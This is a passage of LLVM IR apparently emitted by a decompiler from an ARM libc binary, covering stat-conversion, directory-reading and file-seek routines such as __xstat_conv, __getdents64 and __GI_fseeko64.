  %v2_30a14 = load i32, i32* %v1_30a14, align 4
  %v3_30a14 = add i32 %v0_30a10, 84
  %v4_30a14 = inttoptr i32 %v3_30a14 to i32*
  %v5_30a14 = load i32, i32* %v4_30a14, align 4
  store i32 %v5_30a14, i32* %r1.global-to-local, align 4
  %v0_30a18 = load i32, i32* %r6.global-to-local, align 4
  %v1_30a18 = add i32 %v0_30a18, 64
  %v1_30a1c = inttoptr i32 %v1_30a18 to i32*
  store i32 %v2_30a14, i32* %v1_30a1c, align 4
  %v3_30a1c = add i32 %v0_30a18, 68
  %v4_30a1c = inttoptr i32 %v3_30a1c to i32*
  %v5_30a1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30a1c, i32* %v4_30a1c, align 4
  %v0_30a20 = load i32, i32* %r5.global-to-local, align 4
  %v1_30a20 = add i32 %v0_30a20, 16
  %v2_30a20 = inttoptr i32 %v1_30a20 to i32*
  %v3_30a20 = load i32, i32* %v2_30a20, align 4
  %v1_30a24 = load i32, i32* %r6.global-to-local, align 4
  %v2_30a24 = add i32 %v1_30a24, 16
  %v3_30a24 = inttoptr i32 %v2_30a24 to i32*
  store i32 %v3_30a20, i32* %v3_30a24, align 4
  %v0_30a28 = load i32, i32* %r5.global-to-local, align 4
  %v1_30a28 = add i32 %v0_30a28, 88
  %v1_30a2c = add i32 %v0_30a28, 20
  %v2_30a2c = inttoptr i32 %v1_30a2c to i32*
  %v3_30a2c = load i32, i32* %v2_30a2c, align 4
  store i32 %v3_30a2c, i32* %r2.global-to-local, align 4
  %v1_30a30 = inttoptr i32 %v1_30a28 to i32*
  %v2_30a30 = load i32, i32* %v1_30a30, align 4
  %v3_30a30 = add i32 %v0_30a28, 92
  %v4_30a30 = inttoptr i32 %v3_30a30 to i32*
  %v5_30a30 = load i32, i32* %v4_30a30, align 4
  store i32 %v5_30a30, i32* %r1.global-to-local, align 4
  %v0_30a34 = load i32, i32* %r6.global-to-local, align 4
  %v1_30a34 = add i32 %v0_30a34, 72
  %v1_30a38 = inttoptr i32 %v1_30a34 to i32*
  store i32 %v2_30a30, i32* %v1_30a38, align 4
  %v3_30a38 = add i32 %v0_30a34, 76
  %v4_30a38 = inttoptr i32 %v3_30a38 to i32*
  %v5_30a38 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30a38, i32* %v4_30a38, align 4
  %v0_30a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_30a3c = load i32, i32* %r6.global-to-local, align 4
  %v2_30a3c = add i32 %v1_30a3c, 20
  %v3_30a3c = inttoptr i32 %v2_30a3c to i32*
  store i32 %v0_30a3c, i32* %v3_30a3c, align 4
  %v0_30a40 = load i32, i32* %ip.global-to-local, align 4
  %v1_30a40 = load i32, i32* %r6.global-to-local, align 4
  %v2_30a40 = add i32 %v1_30a40, 24
  %v3_30a40 = inttoptr i32 %v2_30a40 to i32*
  store i32 %v0_30a40, i32* %v3_30a40, align 4
  %v0_30a44 = load i32, i32* %lr.global-to-local, align 4
  %v1_30a44 = load i32, i32* %r6.global-to-local, align 4
  %v2_30a44 = add i32 %v1_30a44, 28
  %v3_30a44 = inttoptr i32 %v2_30a44 to i32*
  store i32 %v0_30a44, i32* %v3_30a44, align 4
  %v2_30a48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_30a48, i32* %r4.global-to-local, align 4
  ret i32 %v2_30a30

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_30a6c = call i32 @__GI_memset()
  %v1_30a70 = add i32 %tmp, 4
  %v2_30a70 = inttoptr i32 %v1_30a70 to i32*
  %v3_30a70 = load i32, i32* %v2_30a70, align 4
  %v2_30a74 = load i32, i32* %arg1, align 4
  store i32 %v2_30a74, i32* %r8.global-to-local, align 4
  %v1_30a78 = load i32, i32* %r5.global-to-local, align 4
  %v2_30a78 = add i32 %v1_30a78, 12
  %v3_30a78 = inttoptr i32 %v2_30a78 to i32*
  store i32 %v3_30a70, i32* %v3_30a78, align 4
  %v0_30a7c = load i32, i32* %r4.global-to-local, align 4
  %v1_30a7c = add i32 %v0_30a7c, 20
  %v2_30a7c = inttoptr i32 %v1_30a7c to i32*
  %v3_30a7c = load i32, i32* %v2_30a7c, align 4
  %v1_30a80 = add i32 %v0_30a7c, 16
  %v2_30a80 = inttoptr i32 %v1_30a80 to i32*
  %v3_30a80 = load i32, i32* %v2_30a80, align 4
  store i32 %v3_30a80, i32* %r6.global-to-local, align 4
  %v1_30a84 = load i32, i32* %r5.global-to-local, align 4
  %v2_30a84 = add i32 %v1_30a84, 44
  %v3_30a84 = inttoptr i32 %v2_30a84 to i32*
  store i32 %v3_30a7c, i32* %v3_30a84, align 4
  %v0_30a88 = load i32, i32* %r4.global-to-local, align 4
  %v1_30a88 = add i32 %v0_30a88, 24
  %v2_30a88 = inttoptr i32 %v1_30a88 to i32*
  %v3_30a88 = load i32, i32* %v2_30a88, align 4
  %v1_30a8c = load i32, i32* %r5.global-to-local, align 4
  %v2_30a8c = add i32 %v1_30a8c, 48
  %v3_30a8c = inttoptr i32 %v2_30a8c to i32*
  store i32 %v3_30a88, i32* %v3_30a8c, align 4
  %v0_30a90 = load i32, i32* %r4.global-to-local, align 4
  %v1_30a90 = add i32 %v0_30a90, 28
  %v2_30a90 = inttoptr i32 %v1_30a90 to i32*
  %v3_30a90 = load i32, i32* %v2_30a90, align 4
  %v1_30a94 = load i32, i32* %r5.global-to-local, align 4
  %v2_30a94 = add i32 %v1_30a94, 52
  %v3_30a94 = inttoptr i32 %v2_30a94 to i32*
  store i32 %v3_30a90, i32* %v3_30a94, align 4
  %v0_30a98 = load i32, i32* %r4.global-to-local, align 4
  %v1_30a98 = add i32 %v0_30a98, 32
  %v1_30a9c = inttoptr i32 %v1_30a98 to i32*
  %v2_30a9c = load i32, i32* %v1_30a9c, align 4
  %v3_30a9c = add i32 %v0_30a98, 36
  %v4_30a9c = inttoptr i32 %v3_30a9c to i32*
  %v5_30a9c = load i32, i32* %v4_30a9c, align 4
  store i32 %v5_30a9c, i32* %r1.global-to-local, align 4
  %v0_30aa0 = load i32, i32* %r5.global-to-local, align 4
  %v1_30aa0 = add i32 %v0_30aa0, 56
  %v1_30aa4 = inttoptr i32 %v1_30aa0 to i32*
  store i32 %v2_30a9c, i32* %v1_30aa4, align 4
  %v3_30aa4 = add i32 %v0_30aa0, 60
  %v4_30aa4 = inttoptr i32 %v3_30aa4 to i32*
  %v5_30aa4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30aa4, i32* %v4_30aa4, align 4
  %v0_30aa8 = load i32, i32* %r4.global-to-local, align 4
  %v1_30aa8 = add i32 %v0_30aa8, 40
  %v1_30aac = inttoptr i32 %v1_30aa8 to i32*
  %v2_30aac = load i32, i32* %v1_30aac, align 4
  %v3_30aac = add i32 %v0_30aa8, 44
  %v4_30aac = inttoptr i32 %v3_30aac to i32*
  %v5_30aac = load i32, i32* %v4_30aac, align 4
  store i32 %v5_30aac, i32* %r1.global-to-local, align 4
  %v0_30ab0 = load i32, i32* %r5.global-to-local, align 4
  %v1_30ab0 = add i32 %v0_30ab0, 64
  %v1_30ab4 = inttoptr i32 %v1_30ab0 to i32*
  store i32 %v2_30aac, i32* %v1_30ab4, align 4
  %v3_30ab4 = add i32 %v0_30ab0, 68
  %v4_30ab4 = inttoptr i32 %v3_30ab4 to i32*
  %v5_30ab4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30ab4, i32* %v4_30ab4, align 4
  %v0_30ab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_30ab8 = add i32 %v0_30ab8, 48
  %v1_30abc = inttoptr i32 %v1_30ab8 to i32*
  %v2_30abc = load i32, i32* %v1_30abc, align 4
  %v3_30abc = add i32 %v0_30ab8, 52
  %v4_30abc = inttoptr i32 %v3_30abc to i32*
  %v5_30abc = load i32, i32* %v4_30abc, align 4
  store i32 %v5_30abc, i32* %r1.global-to-local, align 4
  %v1_30ac0 = add i32 %v0_30ab8, 8
  %v2_30ac0 = inttoptr i32 %v1_30ac0 to i16*
  %v3_30ac0 = load i16, i16* %v2_30ac0, align 2
  %v4_30ac0 = zext i16 %v3_30ac0 to i32
  store i32 %v4_30ac0, i32* %r2.global-to-local, align 4
  %v1_30ac4 = add i32 %v0_30ab8, 10
  %v2_30ac4 = inttoptr i32 %v1_30ac4 to i16*
  %v3_30ac4 = load i16, i16* %v2_30ac4, align 2
  %v4_30ac4 = zext i16 %v3_30ac4 to i32
  store i32 %v4_30ac4, i32* %ip.global-to-local, align 4
  %v1_30ac8 = add i32 %v0_30ab8, 12
  %v2_30ac8 = inttoptr i32 %v1_30ac8 to i16*
  %v3_30ac8 = load i16, i16* %v2_30ac8, align 2
  %v4_30ac8 = zext i16 %v3_30ac8 to i32
  store i32 %v4_30ac8, i32* %lr.global-to-local, align 4
  %v1_30acc = add i32 %v0_30ab8, 14
  %v2_30acc = inttoptr i32 %v1_30acc to i16*
  %v3_30acc = load i16, i16* %v2_30acc, align 2
  %v4_30acc = zext i16 %v3_30acc to i32
  store i32 %v4_30acc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_30ad8 = load i32, i32* %r5.global-to-local, align 4
  %v1_30ad8 = add i32 %v0_30ad8, 72
  %v1_30adc = inttoptr i32 %v1_30ad8 to i32*
  store i32 %v2_30abc, i32* %v1_30adc, align 4
  %v3_30adc = add i32 %v0_30ad8, 76
  %v4_30adc = inttoptr i32 %v3_30adc to i32*
  %v5_30adc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_30adc, i32* %v4_30adc, align 4
  %v0_30ae0 = load i32, i32* %r5.global-to-local, align 4
  %v1_30ae0 = inttoptr i32 %v0_30ae0 to i32*
  %v2_30ae0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_30ae0, i32* %v1_30ae0, align 4
  %v3_30ae0 = add i32 %v0_30ae0, 4
  %v4_30ae0 = inttoptr i32 %v3_30ae0 to i32*
  %v5_30ae0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_30ae0, i32* %v4_30ae0, align 4
  %v0_30ae4 = load i32, i32* %r6.global-to-local, align 4
  %v1_30ae4 = load i32, i32* %r5.global-to-local, align 4
  %v2_30ae4 = add i32 %v1_30ae4, 32
  %v3_30ae4 = inttoptr i32 %v2_30ae4 to i32*
  store i32 %v0_30ae4, i32* %v3_30ae4, align 4
  %v0_30ae8 = load i32, i32* %r7.global-to-local, align 4
  %v1_30ae8 = load i32, i32* %r5.global-to-local, align 4
  %v2_30ae8 = add i32 %v1_30ae8, 36
  %v3_30ae8 = inttoptr i32 %v2_30ae8 to i32*
  store i32 %v0_30ae8, i32* %v3_30ae8, align 4
  %v0_30aec = load i32, i32* %r2.global-to-local, align 4
  %v1_30aec = load i32, i32* %r5.global-to-local, align 4
  %v2_30aec = add i32 %v1_30aec, 16
  %v3_30aec = inttoptr i32 %v2_30aec to i32*
  store i32 %v0_30aec, i32* %v3_30aec, align 4
  %v0_30af0 = load i32, i32* %ip.global-to-local, align 4
  %v1_30af0 = load i32, i32* %r5.global-to-local, align 4
  %v2_30af0 = add i32 %v1_30af0, 20
  %v3_30af0 = inttoptr i32 %v2_30af0 to i32*
  store i32 %v0_30af0, i32* %v3_30af0, align 4
  %v0_30af4 = load i32, i32* %lr.global-to-local, align 4
  %v1_30af4 = load i32, i32* %r5.global-to-local, align 4
  %v2_30af4 = add i32 %v1_30af4, 24
  %v3_30af4 = inttoptr i32 %v2_30af4 to i32*
  store i32 %v0_30af4, i32* %v3_30af4, align 4
  %v0_30af8 = load i32, i32* %r4.global-to-local, align 4
  %v1_30af8 = load i32, i32* %r5.global-to-local, align 4
  %v2_30af8 = add i32 %v1_30af8, 28
  %v3_30af8 = inttoptr i32 %v2_30af8 to i32*
  store i32 %v0_30af8, i32* %v3_30af8, align 4
  ret i32 %v2_30abc

; uselistorder directives
  uselistorder i32 %v0_30ab8, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 72, { 17, 12, 13, 14, 15, 20, 18, 19, 3, 4, 5, 6, 7, 8, 1, 2, 0, 10, 9, 16, 11 }
  uselistorder i32 68, { 1, 2, 5, 3, 0, 4, 7, 8, 6, 9 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_30b40, label %dec_label_pc_30b2c

dec_label_pc_30b2c:                               ; preds = %entry
  %v0_30b2c = call i32 @__GI___errno_location()
  %v0_30b30 = load i32, i32* %r7.global-to-local, align 4
  %v1_30b30 = sub i32 0, %v0_30b30
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_30b38 = inttoptr i32 %v0_30b2c to i32*
  store i32 %v1_30b30, i32* %v2_30b38, align 4
  br label %dec_label_pc_30b50

dec_label_pc_30b40:                               ; preds = %entry
  %v2_30b40 = icmp eq i32 %arg1, 0
  br i1 %v2_30b40, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_30b40
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_30b40, %bb
  call void @__pseudo_cond_branch(i1 %v2_30b40, i32 ptrtoint (i32* @global_var_30a50.2104 to i32))
  br label %dec_label_pc_30b50

dec_label_pc_30b50:                               ; preds = %dec_label_pc_30b2c, %.thread
  %v0_30b50 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_30b50

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_30b50, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_30b64 = load i32, i32* @r4, align 4
  %v6_30b64 = load i32, i32* @r5, align 4
  %v12_30b64 = load i32, i32* @r7, align 4
  %v1_30b68 = add i32 %arg3, 14
  %v2_30b70 = ptrtoint i32* %stack_var_-72 to i32
  %v1_30b74 = and i32 %v1_30b68, -8
  %v2_30b78 = sub i32 %v2_30b70, %v1_30b74
  %v1_30b7c = add i32 %v2_30b78, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_30b7c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_30bb8, label %dec_label_pc_30ba4

dec_label_pc_30ba4:                               ; preds = %entry
  %v0_30ba4 = call i32 @__GI___errno_location()
  %v0_30ba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_30ba8 = sub i32 0, %v0_30ba8
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_30bb0 = inttoptr i32 %v0_30ba4 to i32*
  store i32 %v1_30ba8, i32* %v2_30bb0, align 4
  %v0_30bc0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_30bc0

dec_label_pc_30bb8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_30bc0, label %dec_label_pc_30bc8

dec_label_pc_30bc0:                               ; preds = %dec_label_pc_30bb8, %dec_label_pc_30ba4
  %v0_30bc0 = phi i32 [ -1, %dec_label_pc_30bb8 ], [ %v0_30bc0.pre, %dec_label_pc_30ba4 ]
  store i32 %v0_30bc0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_30c94

dec_label_pc_30bc8:                               ; preds = %dec_label_pc_30bb8
  %v2_30bc8 = add i32 %v1_30b7c, %arg1
  %v2_30bcc = add i32 %tmp, %arg3
  store i32 %v2_30bcc, i32* @ip, align 4
  store i32 %v1_30b7c, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_30c7c

dec_label_pc_30be8:                               ; preds = %dec_label_pc_30c7c
  %v1_30be8 = add i32 %v0_30c3c, 16
  %v2_30be8 = inttoptr i32 %v1_30be8 to i16*
  %v3_30be8 = load i16, i16* %v2_30be8, align 2
  %v4_30be8 = zext i16 %v3_30be8 to i32
  %v1_30bec = add nuw nsw i32 %v4_30be8, 7
  %v1_30bf0 = and i32 %v1_30bec, 131064
  store i32 %v1_30bf0, i32* %r2.global-to-local, align 4
  %v2_30bf8 = add i32 %v1_30bf0, %v0_30c44
  store i32 %v2_30bf8, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_30bf8, %v2_30bcc
  br i1 %tmp26, label %dec_label_pc_30c04, label %dec_label_pc_30c38

dec_label_pc_30c04:                               ; preds = %dec_label_pc_30be8
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_30c0c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_30c0c, i32* %r2.global-to-local, align 4
  %v0_30c10 = load i32, i32* %sl.global-to-local, align 4
  %v1_30c14 = load i32, i32* @sp, align 4
  %v2_30c14 = inttoptr i32 %v1_30c14 to i32*
  store i32 0, i32* %v2_30c14, align 4
  %v5_30c18 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_30c0c, i32 %v0_30c10, i32 ptrtoint (i32* @0 to i32))
  %v0_30c1c = load i32, i32* @r5, align 4
  %v1_30c1c = load i32, i32* %r6.global-to-local, align 4
  %v9_30c1c = icmp eq i32 %v0_30c1c, %v1_30c1c
  br i1 %v9_30c1c, label %dec_label_pc_30c24, label %dec_label_pc_30c90

dec_label_pc_30c24:                               ; preds = %dec_label_pc_30c04
  %v0_30c24 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_30c30 = inttoptr i32 %v0_30c24 to i32*
  store i32 22, i32* %v2_30c30, align 4
  %v0_30c94.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_30c94

dec_label_pc_30c38:                               ; preds = %dec_label_pc_30be8
  %v1_30c38 = inttoptr i32 %v0_30c3c to i32*
  %v2_30c38 = load i32, i32* %v1_30c38, align 4
  %v3_30c38 = add i32 %v0_30c3c, 4
  %v4_30c38 = inttoptr i32 %v3_30c38 to i32*
  %v5_30c38 = load i32, i32* %v4_30c38, align 4
  store i32 %v5_30c38, i32* %r4.global-to-local, align 4
  %v1_30c3c = add i32 %v0_30c3c, 8
  store i32 %v1_30c3c, i32* %sb.global-to-local, align 4
  %v1_30c40 = inttoptr i32 %v1_30c3c to i32*
  %v2_30c40 = load i32, i32* %v1_30c40, align 4
  store i32 %v2_30c40, i32* %sb.global-to-local, align 4
  %v3_30c40 = add i32 %v0_30c3c, 12
  %v4_30c40 = inttoptr i32 %v3_30c40 to i32*
  %v5_30c40 = load i32, i32* %v4_30c40, align 4
  store i32 %v5_30c40, i32* %sl.global-to-local, align 4
  %v1_30c44 = inttoptr i32 %v0_30c44 to i32*
  store i32 %v2_30c38, i32* %v1_30c44, align 4
  %v3_30c44 = add i32 %v0_30c44, 4
  %v4_30c44 = inttoptr i32 %v3_30c44 to i32*
  %v5_30c44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_30c44, i32* %v4_30c44, align 4
  %v0_30c48 = load i32, i32* @r7, align 4
  %v1_30c48 = add i32 %v0_30c48, 8
  %v1_30c4c = inttoptr i32 %v1_30c48 to i32*
  %v2_30c4c = load i32, i32* %v1_30c4c, align 4
  %v3_30c4c = add i32 %v0_30c48, 12
  %v4_30c4c = inttoptr i32 %v3_30c4c to i32*
  %v5_30c4c = load i32, i32* %v4_30c4c, align 4
  store i32 %v5_30c4c, i32* @r4, align 4
  %v1_30c50 = load i32, i32* @r5, align 4
  %v2_30c50 = add i32 %v1_30c50, 8
  %v3_30c50 = inttoptr i32 %v2_30c50 to i32*
  store i32 %v2_30c4c, i32* %v3_30c50, align 4
  %v0_30c54 = load i32, i32* @r4, align 4
  %v1_30c54 = load i32, i32* @r5, align 4
  %v2_30c54 = add i32 %v1_30c54, 12
  %v3_30c54 = inttoptr i32 %v2_30c54 to i32*
  store i32 %v0_30c54, i32* %v3_30c54, align 4
  %v0_30c58 = load i32, i32* %r2.global-to-local, align 4
  %v1_30c58 = trunc i32 %v0_30c58 to i16
  %v2_30c58 = load i32, i32* @r5, align 4
  %v3_30c58 = add i32 %v2_30c58, 16
  %v4_30c58 = inttoptr i32 %v3_30c58 to i16*
  store i16 %v1_30c58, i16* %v4_30c58, align 2
  %v0_30c5c = load i32, i32* @r7, align 4
  %v1_30c5c = add i32 %v0_30c5c, 18
  %v2_30c5c = inttoptr i32 %v1_30c5c to i8*
  %v3_30c5c = load i8, i8* %v2_30c5c, align 1
  %v4_30c5c = zext i8 %v3_30c5c to i32
  store i32 %v4_30c5c, i32* @r3, align 4
  %v2_30c60 = load i32, i32* @r5, align 4
  %v3_30c60 = add i32 %v2_30c60, 18
  %v4_30c60 = inttoptr i32 %v3_30c60 to i8*
  store i8 %v3_30c5c, i8* %v4_30c60, align 1
  %v0_30c64 = load i32, i32* @r7, align 4
  %v1_30c64 = add i32 %v0_30c64, 16
  %v2_30c64 = inttoptr i32 %v1_30c64 to i16*
  %v3_30c64 = load i16, i16* %v2_30c64, align 2
  %v4_30c64 = zext i16 %v3_30c64 to i32
  %v1_30c68 = add nsw i32 %v4_30c64, -19
  store i32 %v1_30c68, i32* @r2, align 4
  %v0_30c6c = call i32 @memcpy()
  %v0_30c70 = load i32, i32* @r7, align 4
  %v1_30c70 = add i32 %v0_30c70, 16
  %v2_30c70 = inttoptr i32 %v1_30c70 to i16*
  %v3_30c70 = load i16, i16* %v2_30c70, align 2
  %v4_30c70 = zext i16 %v3_30c70 to i32
  %v0_30c74 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_30c74, i32* @r5, align 4
  %v2_30c78 = add i32 %v4_30c70, %v0_30c70
  store i32 %v2_30c78, i32* @r7, align 4
  br label %dec_label_pc_30c7c

dec_label_pc_30c7c:                               ; preds = %dec_label_pc_30bc8, %dec_label_pc_30c38
  %v0_30c44 = phi i32 [ %tmp, %dec_label_pc_30bc8 ], [ %v0_30c74, %dec_label_pc_30c38 ]
  %v0_30c3c = phi i32 [ %v1_30b7c, %dec_label_pc_30bc8 ], [ %v2_30c78, %dec_label_pc_30c38 ]
  %v3_30c80 = icmp ult i32 %v0_30c3c, %v2_30bc8
  %v1_30c84 = add i32 %v0_30c44, 19
  store i32 %v1_30c84, i32* @r0, align 4
  %v1_30c88 = add i32 %v0_30c3c, 19
  store i32 %v1_30c88, i32* @r1, align 4
  br i1 %v3_30c80, label %dec_label_pc_30be8, label %dec_label_pc_30c90.loopexit

dec_label_pc_30c90.loopexit:                      ; preds = %dec_label_pc_30c7c
  %v0_30c90.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_30c90

dec_label_pc_30c90:                               ; preds = %dec_label_pc_30c90.loopexit, %dec_label_pc_30c04
  %v1_30c90 = phi i32 [ %v0_30c44, %dec_label_pc_30c90.loopexit ], [ %v0_30c1c, %dec_label_pc_30c04 ]
  %v0_30c90 = phi i32 [ %v0_30c90.pre, %dec_label_pc_30c90.loopexit ], [ %v1_30c1c, %dec_label_pc_30c04 ]
  %v2_30c90 = sub i32 %v1_30c90, %v0_30c90
  store i32 %v2_30c90, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_30c94

dec_label_pc_30c94:                               ; preds = %dec_label_pc_30c24, %dec_label_pc_30bc0, %dec_label_pc_30c90
  %v0_30c94 = phi i32 [ %v0_30c94.pre, %dec_label_pc_30c24 ], [ %v0_30bc0, %dec_label_pc_30bc0 ], [ %v2_30c90, %dec_label_pc_30c90 ]
  store i32 %v3_30b64, i32* %r4.global-to-local, align 4
  store i32 %v6_30b64, i32* @r5, align 4
  store i32 %v12_30b64, i32* @r7, align 4
  ret i32 %v0_30c94

; uselistorder directives
  uselistorder i32 %v0_30c3c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_30c44, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_30b7c, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 2, 3, 1, 0, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_30c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_30c7c, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_30cb0 = load i32, i32* @r1, align 4
  store i32 %v0_30cb0, i32* @r2, align 4
  %v0_30cb8 = call i32 @__GI_fseeko64()
  ret i32 %v0_30cb8
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_30cc8 = load i32, i32* @r4, align 4
  %v6_30cc8 = load i32, i32* @r5, align 4
  %v12_30cc8 = load i32, i32* @r7, align 4
  store i32 %tmp14, i32* @r7, align 4
  %v0_30cdc = load i32, i32* @r2, align 4
  store i32 %v0_30cdc, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r6.global-to-local, align 4
  %v0_30ce8 = load i32, i32* @r0, align 4
  store i32 %v0_30ce8, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp14, 3
  br i1 %tmp, label %dec_label_pc_30d04, label %dec_label_pc_30cf0

dec_label_pc_30cf0:                               ; preds = %entry
  %v0_30cf0 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_30cfc = inttoptr i32 %v0_30cf0 to i32*
  store i32 22, i32* %v2_30cfc, align 4
  br label %dec_label_pc_30df4

dec_label_pc_30d04:                               ; preds = %entry
  %v1_30d04 = add i32 %v0_30ce8, 52
  %v2_30d04 = inttoptr i32 %v1_30d04 to i32*
  %v3_30d04 = load i32, i32* %v2_30d04, align 4
  %v1_30d08 = sub i32 1, %v3_30d04
  store i32 %v1_30d08, i32* %r8.global-to-local, align 4
  %v2_30d08 = icmp ult i32 %v3_30d04, 2
  br i1 %v2_30d08, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_30d04
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_30d50

bb:                                               ; preds = %dec_label_pc_30d04
  %v2_30d10 = icmp eq i32 %v1_30d08, 0
  br i1 %v2_30d10, label %dec_label_pc_30d50, label %dec_label_pc_30d18

dec_label_pc_30d18:                               ; preds = %bb
  %v1_30d1c = add i32 %v0_30ce8, 56
  store i32 %v1_30d1c, i32* @r4, align 4
  %v4_30d20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_30d20, i32* %r1.global-to-local, align 4
  store i32 %v1_30d1c, i32* %r2.global-to-local, align 4
  %v4_30d30 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_30d30)
  %v0_30d44 = load i32, i32* %r6.global-to-local, align 4
  %v2_30d44 = add i32 %v0_30d44, 36
  %v3_30d44 = inttoptr i32 %v2_30d44 to i32*
  %v4_30d44 = load i32, i32* %v3_30d44, align 4
  store i32 %v4_30d44, i32* @ip, align 4
  store i32 200016, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_30d44)
  %v0_30d50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_30d50

dec_label_pc_30d50:                               ; preds = %.thread, %bb, %dec_label_pc_30d18
  %v0_30d5c = phi i32 [ %v0_30ce8, %.thread ], [ %v0_30ce8, %bb ], [ %v0_30d50.pre, %dec_label_pc_30d18 ]
